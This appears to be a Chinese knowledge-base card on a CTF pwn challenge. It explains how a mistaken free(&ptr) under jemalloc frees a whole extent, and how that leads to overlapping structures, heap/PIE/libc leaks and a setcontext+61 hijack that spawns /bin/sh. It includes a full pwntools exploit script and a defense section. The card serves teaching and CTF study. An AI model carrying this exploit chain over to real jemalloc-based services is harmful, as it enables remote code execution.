---
id: binary-pwn-heap-jemalloc-free-anywhere-in-chunk-whole-chunk-free-overlap
title: jemalloc 无 chunk 头：free 块内任意地址都释放整块，误传 &p_fun_chunk 释放掉 table 造成 stale 指针与多块重叠，取得任意读写后改函数指针走 setcontext
type: scenario
domain: binary
path: binary/pwn/heap
technique: jemalloc-free-any-address-in-extent-releases-whole-extent-overlap
aliases:
- jemalloc 非法 free
- free 块内任意地址
- 无 chunk 头释放整块
- table chunk 非法释放
- jemalloc 堆重叠
tags:
- pwn
- heap
- jemalloc
- uaf
- overlapping
- arbitrary-read-write
- function-pointer
- setcontext
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W6
  verified_at: '2026-11-09T00:36:01+08:00'
  notes: 已对照原文核对（强网拟态2024 final Jemalloc）：jemalloc 无 per-chunk 头、free 块内任意地址即释放整块、Free fun chunk 写成 free(&p_fun_chunk) 误释放 table chunk、fold 三模式 type0/1/2 对应 123/312/231、利用链（堆泄漏→PIE→puts→libc→ucontext→setcontext+61→do_func）与 exp 的偏移 0x6ff0/0x7018/0x15bd/0x10f75b 均与正文一致；本次核对未读取图片，仅依据正文；未验证点为 table 结构偏移与 do_func 把 rdx 设为 memory 的说法来自正文文字与 exp 常量，未读反汇编截图；属 CTF 题目非 CVE，原文无受影响版本，未填 affected_versions
---

## 一句话结论

jemalloc 的 extent 没有像 glibc 那样的 chunk 头，`free()` 只按地址反查所属 extent，因此 `free(&chunk)` 与 `free(chunk+任意偏移)` 等价——本题的释放函数忘了解引用（`free(&p_fun_chunk)` 而不是 `free(p_fun_chunk)`），于是「释放 fun 指针块」实际释放掉了整张 table chunk；随后再初始化另一个 type 时该 extent 被重新分配，形成 table0/table2 完全重叠而 stale 指针未清空的局面，用类型切换即可把 show/edit 作用到别的结构上，逐步拿到堆地址、PIE、libc，最后改写 fun 函数指针到 `setcontext+61` 走 SROP 拿 shell。

## 原理

- **jemalloc 与 glibc 的核心差异**：glibc 的 `free(ptr)` 依赖 `ptr` 前方的 `size` 字段定位 chunk，传错指针会崩溃；jemalloc 的分配元数据放在 extent/arena 里，`free()` 通过 `ptr` 反查它属于哪一段 extent，**只要地址落在该 extent 范围内，整段都会被释放**。所以「块内任意地址」都是合法的 free 入口。
- **程序自身的 bug 放大该特性**：`Free fun chunk` 功能写成了 `free(&p_fun_chunk)`（取指针变量的地址），地址落在 table 结构体内 → 释放的是 table extent，而程序记录的 `p_fun_chunk` 与 table 指针都没清空，进入「已释放但仍在用」状态。
- **重叠怎么产生**：三种内存模式（type0/1/2）各有一张 table。先初始化 type0 并误释放其 table，再初始化 type2 时同一大小请求把该 extent 复用来做 type2 的 table；此时 type0 指针仍指向这块内存，于是 `show_basic_info()` 在「模式 0」下读的是 type2 的 table，`edit_basic_info()` 在 type2 下改的是 type1 的字段——**类型切换把越界读写伪装成了正常功能**。
- **为什么能一步步泄干净**：table 结构布局固定（前 0x28 填充 + size + memo 指针），把 memo 指针改成任意地址即可用 `show_memo()` 读出该地址 8 字节；先指向堆上的 fun_chunk 取 PIE（fun 指针属于程序镜像），再指向 GOT 取 `puts` 得到 libc 基址。
- **为什么最后用 setcontext 而不是 hook**：libc 2.39 已无 `__free_hook`/`__malloc_hook` 可用；但 `do_func` 调用 fun 指针时寄存器布局刚好把可控的 memory 指针放进 `rdx`，SROP 需要的一次性 gadget（`setcontext+61` 侧的寄存器装载）因此可以被满足，只要提前在堆上布置好 `ucontext` 结构并把 `fun` 指针改到 `setcontext+61`，就无需再找 magic gadget。

## 触发条件

- 目标使用 jemalloc（`ldd`/`strings`/启动日志可判定），程序自定义了 free 语义（或存在「释放子字段」的功能）。
- 程序的释放路径存在「取地址而非解引用」的错误，或者允许用户指定释放位置。
- 存在可反复初始化的多套同构结构（本例三种内存模式），能在释放后重新申请出同尺寸 extent。
- 程序提供对该结构的读写功能，且读写目标由结构内指针决定（形成任意读写）。
- 存在可被改写的函数指针或回调（本例 `do_func` 的 fun 表）。

## 利用步骤

1. 初始化 type0，调用错误的释放功能，使其释放 table0 的 extent（此时指针未清空）。
2. 初始化 type2，让分配器复用同一 extent 作为 type2 的 table；回到 type0 执行 `show_basic_info`，从 table2 里读出堆地址（`heap = ...`，再算出假块基址 `fake_chunk`）。
3. 再次非法释放并初始化 type1，造成三块重叠；此时在 type2 下 `edit_basic_info` 可改 type1 的 `memo` 指针 → 指向 fun 指针所在块，`show_memo` 读出 PIE 基址。
4. 同样把 type1 的 `memo` 改成 `elf.got['puts']`，`show_memo` 读 `puts`，得到 libc 基址。
5. 把 `memo` 指向重叠区里可连续写的位置，用 `edit_memo` 铺设 `ucontext`（含 `rdi`/`rsp`/`rip` 与 `/bin/sh`），并把 fun 指针改成 `libc.symbols['setcontext']+61`。
6. 触发 `do_func`：`setcontext` 从 ucontext 装载寄存器，跳到 `rdi_ret` → `system("/bin/sh")`。

## PoC

```python
from pwn import *

types = {"type0": 123, "type1": 312, "type2": 231}

def choose(t): sla("Enter your choice >", "1"); sla("Which direction?", str(types[t]))
def edit_memo(c): sla("Enter your choice >", "2"); sla("content > ", c)
def show_memo(): sla("Enter your choice >", "3")
def do_func(): sla("Enter your choice >", "5")
def dele_game(): sla("Enter your choice >", "6")
def show_basic_info(): sla("Enter your choice >", "7")
def edit_basic_info(c): sla("Enter your choice >", "8"); sla("content > ", c)

# 1) 非法释放 type0 的 table，再用 type2 复用 → 泄漏堆地址
choose("type0"); dele_game()
choose("type2"); choose("type0"); show_basic_info()
p.recvuntil('fo:\n'); p.recv(8)
heap = u64(p.recv(8))
fake_chunk = heap - 0x6ff0 - 0x18
leak_addr = fake_chunk + 0x7018

# 2) 二次释放 + type1 → 三块重叠，改 type1.memo 指向 fun_chunk 泄 PIE
dele_game(); choose("type1"); choose("type2")
edit_basic_info(b'b'*0x28 + p64(0x100) + p64(leak_addr))
choose("type1"); show_memo()
p.recvuntil('ent:\n')
elf.address = u64(p.recv(8)) - 0x15bd

# 3) 改 memo 到 GOT 泄 puts → libc
choose("type2")
edit_basic_info(b'b'*0x28 + p64(0x100) + p64(elf.got['puts']))
choose("type1"); show_memo()
p.recvuntil('ent:\n')
libc.address = u64(p.recv(8)) - libc.symbols['puts']
rdi_ret = libc.address + 0x10f75b

# 4) 铺 ucontext 并劫持 fun 指针 → do_func → setcontext+61
choose("type2")
edit_basic_info(b'b'*0x28 + p64(0x100) + p64(fake_chunk + 0x48))
choose("type1")
edit_memo(p64(fake_chunk+0x48) + p64(0)*2 + p64(fake_chunk+0x48+0x20-0x10)
          + p64(libc.symbols['setcontext'] + 61))
edit_memo(p64(fake_chunk + 0xa0))
edit_memo(p64(fake_chunk + 0xb0) + p64(rdi_ret) + p64(fake_chunk+0xb0+0x10)
          + p64(libc.symbols['system']) + b'/bin/sh\x00')
do_func()
p.interactive()
```

## 变体与关联

- **误用形式可以更隐蔽**：`free(ptr->field)`、`free(&arr[i])`、`free(ptr + off)`、把结构体指针当字符串指针释放，在 jemalloc 下都可能变成「释放整块」而不是崩溃。
- **其他分配器**：tcmalloc/Windows 段堆等同样不带 per-chunk 头，思路可迁移；glibc 下等价效果需要 `free` 到 chunk 头部或伪造 chunk。
- **利用面差异**：jemalloc 无 tcache/fastbin 投毒，因此拿任意读写通常依赖「重叠 + 结构内指针」，而不是 freelist 攻击；最后的写原语落地要按目标 libc 版本选 `setcontext`/`__free_hook`（2.34+ 后者已移除）。
- **关联**：同目录 glibc overlapping 卡（fastbin/smallbin、House of Einherjar）是同类「先造重叠再任意写」的 glibc 版本；本条的价值在于指出分配器语义差异会让一个不起眼的取地址操作直接升级成 UAF。

## 检测与防御

- 修 bug：所有释放路径统一 `free(p)` 且释放后置空指针；对「按索引/按字段释放」的接口做类型与归属校验。
- 代码审计关注 jemalloc 项目里 `free(&x)`、`free(x + off)`、`free(obj->field)` 这类写法，它们在 glibc 下会崩、在 jemalloc 下静默释放整块。
- 加固：用 `je_malloc_conf` 打开 `junk:true`/`zero:true` 降低信息泄露；开启 `--enable-debug` 的断言；高风险服务启用 MTE/ASan 或把分配器换成带 per-chunk 校验的实现。
- 检测：运行期出现同一 extent 被两次归还、`show` 类功能返回跨结构数据、函数指针区域被写入（CFI/`-fcf-protection` 可拦截 `setcontext` 型跳转）。
